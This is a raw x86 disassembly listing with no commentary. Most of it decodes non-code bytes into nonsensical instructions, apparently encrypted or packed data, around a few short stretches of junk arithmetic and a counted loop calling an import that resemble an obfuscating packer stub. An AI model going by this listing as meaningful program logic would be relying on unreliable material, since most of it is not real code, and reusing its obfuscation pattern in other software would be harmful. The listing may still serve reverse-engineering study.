  406273:	mov    bh,BYTE PTR [edx+ebx*4]
  406276:	ins    BYTE PTR es:[edi],dx
  406277:	sub    eax,0xae5e4358
  40627c:	imul   edx,ebx,0x6fdefea8
  406282:	pop    esp
  406283:	iret   
  406284:	les    esp,FWORD PTR [edi+0x5ccd96f6]
  40628a:	(bad)  [edx+0xaeef300]
  406290:	hlt    
  406291:	jecxz  0x40624a
  406293:	lock cmp al,0x8e
  406296:	mov    DWORD PTR [edi+eiz*1-0x7a481875],eax
  40629d:	or     edi,esi
  40629f:	es mov ecx,0xa788d2e6
  4062a5:	jle    0x4062d5
  4062a7:	dec    edx
  4062a8:	mov    ebx,0x20af9375
  4062ad:	mov    ch,0xa8
  4062af:	sub    eax,0xa6f6e654
  4062b4:	push   cs
  4062b5:	push   eax
  4062b6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4062b7:	int3   
  4062b8:	inc    esp
  4062b9:	aas    
  4062ba:	inc    ecx
  4062bb:	retf   
  4062bc:	pop    eax
  4062bd:	enter  0x8c8b,0x33
  4062c1:	es ja  0x4062be
  4062c4:	ret    0x6d19
  4062c7:	add    al,0x26
  4062c9:	and    DWORD PTR [ebp-0x41b247d0],eax
  4062cf:	push   ebx
  4062d0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4062d1:	dec    ebx
  4062d2:	cli    
  4062d3:	int3   
  4062d4:	and    eax,0x4c926269
  4062d9:	retf   
  4062da:	outs   dx,DWORD PTR ds:[esi]
  4062db:	sbb    BYTE PTR [eax+0x60938a37],cl
  4062e1:	call   0xdab36f5f
  4062e6:	sbb    eax,0x46383399
  4062eb:	sub    ebp,ecx
  4062ed:	imul   ebx,DWORD PTR [edi-0x1a1a62f2],0x84b2366e
  4062f7:	sahf   
  4062f8:	dec    edi
  4062f9:	rol    DWORD PTR [edx],cl
  4062fb:	bnd jnp 0x40631f
  4062fe:	add    BYTE PTR [edx+0x3ad15919],al
  406304:	retf   0xf451
  406307:	clc    
  406308:	mov    bh,0x0
  40630a:	test   BYTE PTR [bx+si-0x245e],dh
  40630f:	mov    esi,0x876d8574
  406314:	adc    cl,BYTE PTR [edi+0x3b2d9651]
  40631a:	ret    
  40631b:	pop    edx
  40631c:	in     al,0xee
  40631e:	pop    es
  40631f:	cmp    ebp,ebx
  406321:	cs jmp 0xa3a2c4bd
  406327:	pop    edx
  406328:	xchg   esi,eax
  406329:	mov    ah,0x65
  40632b:	add    eax,0x7669f783
  406330:	and    ch,BYTE PTR [ebp-0x7]
  406333:	inc    ebx
  406334:	test   al,0x94
  406336:	sbb    ebx,ebx
  406338:	dec    esp
  406339:	dec    ecx
  40633a:	pop    ss
  40633b:	call   0x3505:0x2f6b12a9
  406342:	in     al,0x4e
  406344:	(bad)  
  406345:	iret   
  406346:	pop    edi
  406347:	pop    edi
  406348:	es out 0xc5,al
  40634b:	call   0xa3fa:0x381d950f
  406352:	or     bh,BYTE PTR [eax-0x39]
  406355:	retf   0x9021
  406358:	inc    ebx
  406359:	outs   dx,BYTE PTR ds:[esi]
  40635a:	and    DWORD PTR [edx+eax*1],esp
  40635d:	jge    0x406360
  40635f:	pop    ebx
  406360:	jmp    0xfc00725b
  406365:	add    bh,BYTE PTR [ebp-0x6bfcf144]
  40636b:	inc    esp
  40636c:	dec    ebp
  40636d:	adc    al,0x3e
  40636f:	xor    BYTE PTR [ecx+0x4d],bl
  406372:	mov    bl,0x62
  406374:	inc    edi
  406375:	and    al,0x5c
  406377:	add    ebx,esi
  406379:	daa    
  40637a:	loopne 0x406305
  40637c:	push   0x22e9fafa
  406381:	call   0xb7f7913d
  406386:	sbb    DWORD PTR [esi+0x5f608b39],0xffffff87
  40638d:	outs   dx,BYTE PTR ds:[esi]
  40638e:	(bad)  
  406390:	or     DWORD PTR [ecx+0x0],0xa212d9d7
  406397:	add    al,0xec
  406399:	dec    edx
  40639a:	inc    ecx
  40639b:	addr16 mov ah,0x16
  40639e:	ret    
  40639f:	pop    ebp
  4063a0:	addr16 retf 0x4029
  4063a4:	mov    al,ds:0xef445f17
  4063a9:	mov    es,esi
  4063ab:	push   edx
  4063ac:	sbb    al,0xb9
  4063ae:	adc    esi,esp
  4063b0:	mov    dl,0x89
  4063b2:	fcom   QWORD PTR [ecx]
  4063b4:	fld    TBYTE PTR [eax+0x9]
  4063b7:	test   DWORD PTR [ecx-0x314d4436],esp
  4063bd:	mov    ds:0xf86bcc9f,eax
  4063c2:	test   DWORD PTR [edi-0x76ada35f],esi
  4063c8:	rcr    BYTE PTR ds:0x3d4524e3,cl
  4063ce:	loop   0x4063cf
  4063d0:	test   ebx,esi
  4063d2:	cmp    BYTE PTR [edi],dh
  4063d4:	push   es
  4063d5:	mov    ecx,DWORD PTR [ebp+0x6c]
  4063d8:	sub    edx,ebx
  4063da:	out    dx,eax
  4063db:	test   eax,0x980a8e16
  4063e0:	gs cwde 
  4063e2:	pop    ss
  4063e3:	add    eax,0xc0cf7c32
  4063e8:	push   ecx
  4063e9:	xor    BYTE PTR [edi+0x1f],cl
  4063ec:	ret    
  4063ed:	cs in  al,dx
  4063ef:	xor    BYTE PTR [esi-0x1b],dh
  4063f2:	aad    0x90
  4063f4:	loope  0x406471
  4063f6:	daa    
  4063f7:	push   es
  4063f8:	dec    ebx
  4063f9:	stc    
  4063fa:	pop    ds
  4063fb:	retf   0xb5ae
  4063fe:	sub    DWORD PTR [ecx],ebx
  406400:	fisttp WORD PTR [eax+0x39af12bd]
  406406:	pop    ebp
  406407:	(bad)  
  406408:	in     al,dx
  406409:	(bad)  
  40640a:	mov    ebp,0xb42e0322
  40640f:	repz mov eax,ds:0x835d8def
  406415:	adc    al,0xc9
  406417:	pop    ss
  406418:	loop   0x40646e
  40641a:	add    edx,DWORD PTR [eax]
  40641c:	inc    esi
  40641d:	fdiv   st(1),st
  40641f:	(bad)  
  406420:	std    
  406421:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406422:	push   cs
  406423:	jg     0x406444
  406425:	and    esp,DWORD PTR [ebx+0x5c]
  406428:	lahf   
  406429:	adc    eax,0xf4499a72
  40642e:	(bad)  
  40642f:	dec    ebp
  406430:	fnstsw WORD PTR [edi+0x4d58e0c]
  406436:	jb     0x4063c0
  406438:	(bad)  
  406439:	rcr    DWORD PTR [edi-0x279e501e],0xa7
  406440:	aad    0xa7
  406442:	stc    
  406443:	inc    ebx
  406444:	mov    edx,0x2cfd6011
  406449:	loop   0x40640c
  40644b:	ds push 0xb7c2f2b2
  406451:	imul   ebx,DWORD PTR [ecx-0x1f],0x7f
  406455:	push   0xfe9d4b3c
  40645a:	(bad)  [eax+0x5b5a3aa]
  406460:	dec    eax
  406461:	stc    
  406462:	shr    DWORD PTR [esi],0x68
  406465:	jmp    0x6609f896
  40646a:	test   eax,0xd1e353e2
  40646f:	xor    cl,BYTE PTR [esi+0x1fe031ff]
  406475:	addr16 jo 0x406442
  406478:	mov    edx,0xf92e6325
  40647d:	sub    bh,BYTE PTR [ebx-0x45]
  406480:	mov    bh,0x3b
  406482:	popa   
  406483:	inc    eax
  406484:	test   eax,0xed0f40b8
  406489:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40648a:	mov    eax,0xcc59c07
  40648f:	retf   0x70be
  406492:	mov    dl,0xc2
  406494:	jmp    DWORD PTR [ebx+0x3c]
  406497:	or     DWORD PTR ds:0x8916aacc,ecx
  40649d:	inc    esp
  40649e:	repz cmp DWORD PTR [edx],esp
  4064a1:	inc    esi
  4064a2:	inc    esp
  4064a3:	sub    DWORD PTR [ebp-0x23],esp
  4064a6:	mov    ah,0xda
  4064a8:	into   
  4064a9:	mul    edi
  4064ab:	add    DWORD PTR [ecx+edi*4],ecx
  4064ae:	jg     0x406456
  4064b0:	jmp    0x8ed45880
  4064b5:	iret   
  4064b6:	jmp    0x99482a86
  4064bb:	lods   eax,DWORD PTR ds:[esi]
  4064bc:	fwait
  4064bd:	out    dx,eax
  4064be:	push   eax
  4064bf:	clc    
  4064c0:	(bad)
  4064c3:	jmp    0x2e541ef1
  4064c8:	xchg   edx,eax
  4064c9:	jmp    0x3253af86
  4064ce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4064cf:	iret   
  4064d0:	ins    DWORD PTR es:[edi],dx
  4064d1:	add    al,0x8d
  4064d3:	cli    
  4064d4:	out    dx,eax
  4064d5:	retf   0xe430
  4064d8:	mov    ds,WORD PTR [edx+0x5c]
  4064db:	out    0x10,eax
  4064dd:	cmc    
  4064de:	pop    ds
  4064df:	push   es
  4064e0:	mov    ecx,0x65b7a01
  4064e5:	popf   
  4064e6:	and    BYTE PTR [esi+edx*2+0x7f],ah
  4064ea:	(bad)  
  4064eb:	(bad)  
  4064ec:	sar    cl,1
  4064ee:	mov    ch,0x30
  4064f0:	stos   DWORD PTR es:[edi],eax
  4064f1:	push   0x63b4aa09
  4064f6:	repz sbb esp,DWORD PTR [edi+esi*4+0x644d634d]
  4064fe:	cmp    al,0x8b
  406500:	sti    
  406501:	mov    ah,0x60
  406503:	fwait
  406504:	stc    
  406505:	clc    
  406506:	arpl   WORD PTR [esi],si
  406508:	add    ecx,0xffffff8f
  40650b:	imul   edi,DWORD PTR [edx-0x73928f2f],0xb53ec531
  406515:	es cdq 
  406517:	out    0xec,al
  406519:	(bad)
  40651d:	or     ch,al
  40651f:	out    0x55,eax
  406521:	xchg   esi,eax
  406522:	mov    ss,edi
  406524:	cmp    al,0xe
  406526:	loope  0x40658a
  406528:	outs   dx,DWORD PTR ds:[esi]
  406529:	pop    ds
  40652a:	ffreep st(1)
  40652c:	aad    0x17
  40652e:	xor    al,BYTE PTR [edx+0x6beb7721]
  406534:	xor    al,0x2c
  406536:	mov    esi,DWORD PTR [eax-0x13]
  406539:	stos   DWORD PTR es:[edi],eax
  40653a:	add    edi,DWORD PTR [ecx+0x7464ca50]
  406540:	sbb    ebp,DWORD PTR [edi-0xd]
  406543:	cmp    BYTE PTR [ecx-0x783917eb],bl
  406549:	sbb    DWORD PTR [esi],0x2e
  40654c:	and    bh,BYTE PTR [ebx]
  40654e:	ins    BYTE PTR es:[edi],dx
  40654f:	(bad)  
  406550:	(bad)  
  406551:	add    al,0xe8
  406553:	in     eax,dx
  406554:	bound  ebp,QWORD PTR [edi]
  406556:	jecxz  0x4064f4
  406558:	stos   DWORD PTR es:[edi],eax
  406559:	in     al,dx
  40655a:	fsub   DWORD PTR [ebx]
  40655c:	xchg   BYTE PTR [edi-0x158e8035],ah
  406562:	sti    
  406563:	in     eax,dx
  406564:	pop    ebp
  406565:	push   es
  406566:	jnp    0x406570
  406568:	dec    ebx
  406569:	push   0x468585ec
  40656e:	js     0x406505
  406570:	js     0x406525
  406572:	int    0xc4
  406574:	int3   
  406575:	shr    DWORD PTR [esi],0xe1
  406578:	retf   0x4ef3
  40657b:	jg     0x4065b3
  40657d:	pop    ecx
  40657e:	xchg   ebx,eax
  40657f:	inc    ebx
  406580:	das    
  406581:	jmp    0xbca0:0xbb408f3d
  406588:	jmp    0xaf55:0x4a64545d
  40658f:	or     edi,DWORD PTR ds:0x768e2703
  406595:	scas   al,BYTE PTR es:[edi]
  406596:	push   edx
  406597:	or     eax,DWORD PTR gs:[ebp+edi*8-0x2a]
  40659c:	jo     0x4065ea
  40659e:	out    dx,eax
  40659f:	or     cl,BYTE PTR [ebp-0x1]
  4065a2:	lea    eax,[ebp-0x24]
  4065a5:	movzx  ecx,WORD PTR ds:0x4345bb
  4065ac:	and    ecx,DWORD PTR ds:0x4344f3
  4065b2:	mov    DWORD PTR ds:0x4345bb,ecx
  4065b8:	mov    DWORD PTR [ebp-0x28],eax
  4065bb:	adc    DWORD PTR ds:0x4344ff,ecx
  4065c1:	mov    eax,DWORD PTR [ebp+0x8]
  4065c4:	sbb    ecx,DWORD PTR ds:0x43460f
  4065ca:	mov    DWORD PTR [ebp-0x20],eax
  4065cd:	push   ebx
  4065ce:	sub    DWORD PTR ds:0x4344f7,ebx
  4065d4:	lea    eax,[ebp-0x18]
  4065d7:	mov    DWORD PTR [ebp-0x1c],eax
  4065da:	xor    DWORD PTR ds:0x43454f,edx
  4065e0:	mov    eax,DWORD PTR [ebp-0x1c]
  4065e3:	and    DWORD PTR ds:0x4344eb,0x0
  4065ed:	mov    ecx,DWORD PTR ds:0x4344eb
  4065f3:	inc    ecx
  4065f4:	mov    DWORD PTR ds:0x4344eb,ecx
  4065fa:	cmp    DWORD PTR ds:0x4344eb,0x1e
  406601:	jne    0x40661a
  406607:	push   DWORD PTR [ebp-0x14]
  40660a:	push   0x434547
  40660f:	push   0x43481f
  406614:	call   DWORD PTR ds:0x413400
  40661a:	cmp    DWORD PTR ds:0x4344eb,0x1c
  406621:	jb     0x4065ed
  406627:	jmp    0x406a15
  40662c:	call   0x70d95cef
  406631:	mov    al,0x70
  406633:	dec    esi
  406634:	mov    BYTE PTR [ecx],dh
  406636:	push   esi
  406637:	inc    esp
  406638:	mov    BYTE PTR [ebp+edi*1+0x7e3b4cc2],cl
  40663f:	jle    0x406690
  406641:	jns    0x4066c1
  406643:	jle    0x406683
  406645:	dec    ecx
  406646:	push   0xb1256f69
  40664b:	push   esp
  40664c:	xchg   dl,dh
  40664e:	imul   edx,DWORD PTR [ebp-0x54178b2e],0xfffffff9
  406655:	mov    bl,BYTE PTR [eax-0x7d31b0c0]
  40665b:	jge    0x4066a8
  40665d:	inc    edi
  40665e:	xor    ah,dl
  406660:	adc    al,0x17
  406662:	lds    edi,FWORD PTR [esi-0x29]
  406665:	stc    
  406666:	xchg   ebx,eax
  406667:	mov    cl,0x6
  406669:	push   es
  40666a:	jo     0x4066c8
  40666c:	js     0x406674
  40666e:	mov    ecx,0x334a55cd
  406673:	push   ds
  406674:	adc    al,0x75
  406676:	arpl   cx,ax
  406678:	and    ch,ch
  40667a:	aad    0x1a
  40667c:	imul   edx,DWORD PTR [ebx],0xffffff9a
  40667f:	xchg   esi,eax
  406680:	jns    0x4066db
  406682:	mov    dh,0xeb
  406684:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406686:	sub    DWORD PTR [ebx-0x2d137404],ebp
  40668c:	mov    ebp,0xa5b8e7bd
  406691:	jg     0x4066ef
  406693:	push   edi
  406694:	into   
  406695:	ins    DWORD PTR es:[edi],dx
  406696:	clc    
  406697:	sbb    bh,ch
  406699:	jne    0x4066de
  40669b:	jbe    0x406705
  40669d:	or     DWORD PTR ds:0x20d8945d,edi
  4066a3:	mov    edi,0x232c5fa9
  4066a8:	mov    WORD PTR [ebp+edi*8+0x37],fs
  4066ac:	test   DWORD PTR [eax+eax*2+0x68be9a9],edi
  4066b3:	aas    
  4066b4:	icebp  
  4066b5:	daa    
  4066b6:	iret   
  4066b7:	cs aas 
  4066b9:	pop    esp
  4066ba:	(bad)  
  4066bb:	mov    ebp,0x9263c92b
  4066c0:	sbb    BYTE PTR [edi+edx*8-0x38b9d255],dh
  4066c7:	jmp    0x40668a
  4066c9:	add    al,BYTE PTR [edi-0x33b3a764]
  4066cf:	ret    0x3b25
  4066d2:	mov    cl,0xc5
  4066d4:	sub    DWORD PTR [esi-0x79],ecx
  4066d7:	or     edx,DWORD PTR [ebx-0x69]
  4066da:	push   eax
  4066db:	pop    ss
  4066dc:	cli    
  4066dd:	inc    edx
  4066de:	jp     0x406733
  4066e0:	test   al,0x97
  4066e2:	jl     0x40671b
  4066e4:	enter  0x1c99,0xe7
  4066e8:	out    0x3b,al
  4066ea:	mov    bl,0x65
  4066ec:	adc    DWORD PTR [edi],esp
  4066ee:	and    bh,BYTE PTR [eax-0x64]
  4066f1:	inc    esp
  4066f2:	dec    edx
  4066f3:	mov    edx,0x17b09915
  4066f8:	(bad)  
  4066f9:	push   ecx
  4066fa:	mov    dh,0x69
  4066fc:	(bad)  
  4066fd:	js     0x4066fc
  4066ff:	push   eax
  406700:	sbb    al,BYTE PTR [ecx]
  406702:	fisttp WORD PTR [ebx+edx*8]
  406705:	mov    esp,0xa1928c87
  40670a:	push   ebx
  40670b:	mov    ch,0xea
  40670d:	or     DWORD PTR [eax],esp
  40670f:	mov    ah,0x45
  406711:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406712:	sbb    al,0xa8
  406714:	shl    BYTE PTR [edi-0x3bbbfbbf],cl
  40671a:	mov    edi,0xe6ae0b8e
  40671f:	shr    DWORD PTR [ebx-0x3e2ff438],1
  406725:	inc    edi
  406726:	adc    al,BYTE PTR [eax-0x16dbc65f]
  40672c:	in     al,dx
  40672d:	dec    ebp
  40672e:	cmp    DWORD PTR [eax-0x65],ecx
  406731:	inc    ebx
  406732:	push   ds
  406733:	and    BYTE PTR [edx],dh
  406735:	add    al,0xc1
  406737:	inc    edi
  406738:	and    DWORD PTR [eax],esp
  40673a:	cmp    BYTE PTR [eax],0xc7
  40673d:	test   eax,0xe865810
  406742:	leave  
  406743:	stos   DWORD PTR es:[edi],eax
  406744:	out    0x42,al
  406746:	pop    es
  406747:	mov    edx,0x360565dc
  40674c:	sbb    al,ch
  40674e:	push   ebp
  40674f:	test   al,0x40
  406751:	adc    BYTE PTR [edx-0x1bffd6bc],dh
  406757:	jae    0x406708
  406759:	adc    DWORD PTR [ebp+0x3a],0xa7512ace
  406760:	xor    DWORD PTR [ecx],esi
  406762:	cdq    
  406763:	ins    BYTE PTR es:[edi],dx
  406764:	adc    DWORD PTR [eax],ebp
  406766:	cmp    eax,0x549647a
  40676b:	dec    ebp
  40676c:	sti    
  40676d:	out    0xdf,al
  40676f:	lahf   
  406770:	pusha  
  406771:	jae    0x40675b
  406773:	xchg   ebx,eax
  406774:	ja     0x406739
  406776:	mov    esi,0x4b11bd74
  40677b:	or     eax,0x8d8f9259
  406780:	adc    esi,DWORD PTR [ebx-0x1d]
  406783:	fstp   QWORD PTR [ecx+0x1b42ba99]
  406789:	retf   
  40678a:	pop    ss
  40678b:	les    edx,FWORD PTR [ebp-0x33]
  40678e:	xchg   esi,eax
  40678f:	mov    WORD PTR [ecx+0x4da4b692],cs
  406795:	mov    ?,WORD PTR [ebx-0x37f9e62d]
  40679b:	retf   
  40679c:	fwait
  40679d:	(bad)
  4067a1:	cmp    ch,bh
  4067a3:	bnd jnp 0x406754
  4067a6:	jns    0x406804
  4067a8:	sub    BYTE PTR [esi+0x2b],0x60
  4067ac:	xchg   ecx,eax
  4067ad:	hlt    
  4067ae:	and    al,0x6b
  4067b0:	push   ecx
  4067b1:	mov    eax,DWORD PTR [ebp+0x6e]
  4067b4:	aam    0x84
  4067b6:	mov    eax,ds:0x5cd776b3
  4067bb:	lods   eax,DWORD PTR ds:[esi]
  4067bc:	data16 jbe 0x4067a9
  4067bf:	ficomp WORD PTR ds:0x23925248
  4067c5:	pop    es
  4067c6:	jmp    0xbb9dcfbc
  4067cb:	jecxz  0x4067b2
  4067cd:	fsubr  st(0),st
  4067cf:	xchg   ecx,eax
  4067d0:	ins    BYTE PTR es:[edi],dx
  4067d1:	jnp    0x406766
  4067d3:	mov    ebx,0xbbd9b468
  4067d8:	dec    ebp
  4067d9:	int    0x3d
  4067db:	or     al,BYTE PTR [ebp-0x54]
  4067de:	push   eax
  4067df:	xchg   DWORD PTR [esi],eax
  4067e1:	push   ecx
  4067e2:	adc    eax,0xd6c04cc6
  4067e7:	xor    ebp,DWORD PTR ds:0xe57cbcc9
  4067ed:	push   ss
  4067ee:	call   0x93cd:0x1beff57e
  4067f5:	or     eax,0xad1c6f34
  4067fa:	lods   al,BYTE PTR ds:[esi]
  4067fb:	shl    esi,1
  4067fd:	push   ecx
  4067fe:	cld    
  4067ff:	outs   dx,DWORD PTR ds:[esi]
  406800:	push   cs
  406801:	int3   
  406802:	shl    ebp,1
  406804:	jbe    0x4067d8
  406806:	div    dh
  406808:	loop   0x40683a
  40680a:	repnz cs out dx,al
  40680d:	jo     0x406862
  40680f:	mov    ah,0x98
  406811:	test   al,0xed
  406813:	mov    esp,DWORD PTR [esi+eax*8]
  406816:	cld    
  406817:	push   ebx
  406818:	fcomp  st(2)
  40681a:	jb     0x406879
  40681c:	mov    eax,gs:0x988a7e3e
  406822:	add    eax,0x20ab7c19
  406827:	fwait
  406828:	outs   dx,BYTE PTR ds:[esi]
  406829:	sar    BYTE PTR [ecx],1
  40682b:	sbb    eax,0xc0fbe889
  406830:	xchg   edi,eax
  406831:	add    DWORD PTR [ebx-0x1b],esp
  406834:	ret    
  406835:	add    DWORD PTR ss:[ebp+0x62cfe2f9],0x78
  40683d:	cmp    ah,BYTE PTR [ebx+0x22]
  406840:	push   0xffffffb1
  406842:	mov    ecx,0x5a4bbeaa
  406847:	and    al,0xec
  406849:	imul   cl
  40684b:	dec    ebp
  40684c:	inc    edi
  40684d:	mov    ebx,0xca1e7cf1
  406852:	push   DWORD PTR [edi]
  406854:	mov    WORD PTR [ebx],ss
  406856:	popa   
  406857:	(bad)  
  406858:	rol    BYTE PTR [edx-0x72],1
  40685b:	ror    DWORD PTR [ebp-0x5d4909a8],0x80
  406862:	js     0x40684d
  406864:	push   ss
  406865:	jmp    0x4068cb
  406867:	imul   ebx,DWORD PTR [ebx+ecx*8-0x6802fd73],0x87b0fbff
  406872:	int3   
  406873:	cmp    eax,0x5df735e
  406878:	cmp    al,0x3
  40687a:	call   0xa98f6dc6
  40687f:	jle    0x406860
  406881:	arpl   ax,ax
  406883:	cmp    BYTE PTR [edx+0x72],0xf7
  406887:	loopne 0x406838
  406889:	mov    ds:0x3c4d124b,eax
  40688e:	mov    dl,0xd6
  406890:	fwait
  406891:	cs sbb edx,ebp
  406894:	pop    ebp
  406895:	test   eax,0xb4c02f29
  40689a:	nop
  40689b:	mov    ds:0x2ac2e119,eax
  4068a0:	jnp    0x406873
  4068a2:	enter  0x99c3,0x85
  4068a6:	add    ecx,eax
  4068a8:	sbb    edx,ecx
  4068aa:	scas   eax,DWORD PTR es:[edi]
  4068ab:	daa    
  4068ac:	jmp    0x406929
  4068ae:	ret    0x1f97
  4068b1:	and    DWORD PTR [edx+ebp*8-0x1f],esp
  4068b5:	adc    BYTE PTR [esi-0x46ce7238],0x95
  4068bc:	arpl   WORD PTR [ebx],si
  4068be:	call   0xfc99:0xc4eaa315
  4068c5:	scas   eax,DWORD PTR es:[edi]
  4068c6:	shl    BYTE PTR [esi-0x2c70797c],0x6c
  4068cd:	sbb    DWORD PTR [edi+eiz*4+0x1f7158fe],esp
  4068d4:	xor    al,0xd0
  4068d6:	cmp    eax,DWORD PTR [esi+0x25679463]
  4068dc:	pop    ecx
  4068dd:	pusha  
  4068de:	jb     0x406916
  4068e0:	mov    ah,0x6d
  4068e2:	dec    esi
  4068e3:	psraw  mm1,mm4
  4068e6:	pop    ecx
  4068e7:	jp     0x4068cc
  4068e9:	push   esi
  4068ea:	dec    esp
  4068eb:	mov    edx,0xebfc7bb2
  4068f0:	mov    esi,0xeb85766c
  4068f5:	mov    edi,0x9fc52e71
  4068fa:	jle    0x4068a2
  4068fc:	pushf  
  4068fd:	jecxz  0x4068b1
  4068ff:	(bad)  
  406900:	mul    ecx
  406902:	push   eax
  406903:	out    0xc9,eax
  406905:	adc    bh,BYTE PTR [edi-0x602d1410]
  40690b:	jge    0x4068ab
  40690d:	ror    BYTE PTR [ecx-0x6acc0630],cl
  406913:	inc    ecx
  406914:	push   0xffffffe5
  406916:	cmp    al,al
  406918:	mov    DWORD PTR [ebx],eax
  40691a:	fbstp  TBYTE PTR [esi+0x19954030]
  406920:	lods   eax,DWORD PTR ds:[esi]
  406921:	into   
  406922:	iret   
  406923:	int3   
  406924:	mov    WORD PTR [esi+0x4250920b],?
  40692a:	mov    cl,0xd7
  40692c:	out    0x5e,al
  40692e:	xor    eax,0x18e53894
  406933:	(bad)  
  406934:	jmp    0xd10d5487
  406939:	div    dh
  40693b:	xor    DWORD PTR [edx-0xb],ebx
  40693e:	mov    ?,WORD PTR [edi+0x48cae4a2]
  406944:	sti    
  406945:	mov    dl,0x51
  406947:	sbb    eax,0x18162436
  40694c:	cmc    
  40694d:	lock ror DWORD PTR [ebp-0x50754de0],1
  406954:	call   0xcae9:0x8ccdc691
  40695b:	cmp    ebx,DWORD PTR [esi]
  40695d:	sub    ebp,DWORD PTR [ebp+0x3662481a]
  406963:	leave  
  406964:	inc    esp
  406965:	or     eax,DWORD PTR [edi]
  406967:	inc    eax
  406968:	mov    esp,0x255e1ee9
  40696d:	cmp    ch,bh
  40696f:	ins    BYTE PTR es:[edi],dx
  406970:	push   0x39
  406972:	mov    al,0x2b
  406974:	mov    eax,cs:0xcac78eab
  40697a:	loopne 0x406998
  40697c:	lods   al,BYTE PTR ds:[esi]
  40697d:	es push edi
  40697f:	add    DWORD PTR es:[ecx-0x66],eax
  406983:	mov    DWORD PTR [ebx],esp
  406985:	mov    ah,bl
  406987:	xor    al,dh
  406989:	mov    DWORD PTR [ebx],0x70c57b2c
  40698f:	sbb    ecx,edx
  406991:	mov    eax,ds:0x57209e18
  406996:	pop    ss
  406997:	mov    bl,dl
  406999:	xchg   BYTE PTR [esi],dh
  40699b:	and    dl,bh
  40699d:	mov    ebp,ebp
  40699f:	retf   
  4069a0:	xchg   ecx,eax
  4069a1:	aaa    
  4069a2:	mov    WORD PTR [ecx-0x4be2abeb],cs
  4069a8:	sar    BYTE PTR [ebx],0x91
  4069ab:	outs   dx,DWORD PTR ds:[esi]
  4069ac:	ja     0x4069d0
  4069ae:	not    ah
  4069b0:	push   ebp
  4069b1:	jle    0x40698e
  4069b3:	das    
  4069b4:	outs   dx,BYTE PTR ds:[esi]
  4069b5:	(bad)  
  4069b6:	in     al,dx
  4069b7:	hlt    
  4069b8:	push   edi
  4069b9:	shl    DWORD PTR ds:[edx+0x3],1
  4069bd:	push   ebp
  4069be:	faddp  st(5),st
  4069c0:	pop    es
  4069c1:	mov    bl,0x49
  4069c3:	xchg   esi,eax
  4069c4:	xchg   esi,eax
  4069c5:	repnz call FWORD PTR [edi]
  4069c8:	pop    edx
  4069c9:	jno    0x4069f3
  4069cb:	pop    ebx
  4069cc:	or     al,dh
  4069ce:	mov    ds:0x7da7ad04,al
  4069d3:	push   edx
  4069d4:	adc    ebx,DWORD PTR [edx-0x3d]
  4069d7:	jle    0x406a52
  4069d9:	jle    0x406a1c
  4069db:	je     0x406989
  4069dd:	ins    DWORD PTR es:[edi],dx
  4069de:	arpl   bx,cx
  4069e0:	sbb    ebx,DWORD PTR [ebp-0x67c06605]
  4069e6:	sar    BYTE PTR [ecx+0x59],1
  4069e9:	mov    cl,0xeb
  4069eb:	sbb    BYTE PTR [eax+0x34400c50],dh
  4069f1:	iret   
  4069f2:	stc    
  4069f3:	fcomip st,st(6)
  4069f5:	enter  0xab35,0x7e
  4069f9:	shl    ch,cl
  4069fb:	aaa    
  4069fc:	jne    0x406998
  4069fe:	mov    bh,0x43
  406a00:	ret    
  406a01:	js     0x406a1b
  406a03:	out    dx,eax
  406a04:	push   edi
  406a05:	or     esi,DWORD PTR [edx+edx*4]
  406a08:	push   0x9d0afea6
  406a0d:	test   al,0xdb
  406a0f:	retf   
  406a10:	call   0x5756:0xf585430
  406a17:	xor    edi,ecx
  406a19:	mov    edi,0xf89f2dae
  406a1e:	mov    DWORD PTR [eax],edi
  406a20:	mov    eax,DWORD PTR [ebp-0x14]
  406a23:	mov    ebx,DWORD PTR [ebp-0x8]
  406a26:	xor    DWORD PTR ds:0x434583,ebx
  406a2c:	mov    ecx,0x7510851
  406a31:	xor    eax,ecx
  406a33:	sbb    esi,DWORD PTR ds:0x4344fb
  406a39:	mov    esi,0x327299
  406a3e:	xor    ebx,ecx
  406a40:	add    DWORD PTR ds:0x43453b,0x4345f7
  406a4a:	xor    edx,edx
  406a4c:	add    eax,esi
  406a4e:	sbb    DWORD PTR ds:0x4344df,0x1c54
  406a58:	add    ebx,esi
  406a5a:	div    ebx
  406a5c:	mov    DWORD PTR ds:0x434537,edi
  406a62:	jmp    0x406e50
  406a67:	inc    ebx
  406a68:	push   ebp
  406a69:	sti    
  406a6a:	sbb    DWORD PTR [ebp-0x49aabca3],0xffffff8a
  406a71:	mov    ds:0x40d8f2eb,eax
  406a76:	mov    bl,BYTE PTR [ebp+0x4f7e7ec7]
  406a7c:	jns    0x406afc
  406a7e:	jle    0x406aaa
  406a80:	fnstenv [edi]
  406a82:	push   eax
  406a83:	retf   0x96e8
  406a86:	aaa    
  406a87:	cld    
  406a88:	pop    ebp
  406a89:	push   ebp
  406a8a:	and    al,0x6
  406a8c:	jg     0x406a51
  406a8e:	jns    0x406a1e
  406a90:	mov    ch,0x22
  406a92:	outs   dx,DWORD PTR ds:[esi]
  406a93:	lock jo 0x406aba
  406a96:	imul   ebx,DWORD PTR [ebp+0x471a3829],0xffffff91
  406a9d:	and    al,0x4d
  406a9f:	sub    ecx,DWORD PTR [esp+ebx*1-0x14]
  406aa3:	int3   
  406aa4:	mov    dh,0x88
  406aa6:	or     BYTE PTR ds:0xd18b117f,bh
  406aac:	iret   
  406aad:	sub    al,ah
  406aaf:	daa    
  406ab0:	xor    BYTE PTR ds:0xfbb2b09c,ch
  406ab6:	pop    edx
  406ab7:	out    0x0,al
  406ab9:	and    al,0xce
  406abb:	imul   BYTE PTR [ebp-0x1b46b92e]
  406ac1:	jae    0x406a85
  406ac3:	jbe    0x406a6c
  406ac5:	add    eax,0x5c69b90b
  406aca:	mov    bh,0x7b
  406acc:	ret    0x2fc8
  406acf:	in     al,0x9
  406ad1:	or     eax,eax
  406ad3:	jl     0x406b40
  406ad5:	loope  0x406a81
  406ad7:	das    
  406ad8:	lock inc edi
  406ada:	imul   edi,DWORD PTR [ebx-0x4b55d5fc],0xffffffa2
  406ae1:	or     DWORD PTR [edx-0x77cd0305],0x8
  406ae8:	cli    
